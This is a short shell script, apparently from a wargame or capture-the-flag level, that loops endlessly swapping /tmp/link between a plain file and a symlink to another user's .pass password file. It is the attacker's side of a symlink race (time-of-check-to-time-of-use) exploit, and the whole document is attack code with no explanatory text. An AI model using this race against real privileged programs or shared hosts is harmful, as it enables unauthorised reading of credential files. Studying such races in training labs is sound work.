while (true)
do
	touch /tmp/link;
	rm /tmp/link;
	ln -s /home/users/level09/.pass /tmp/link;
	rm /tmp/link;
done
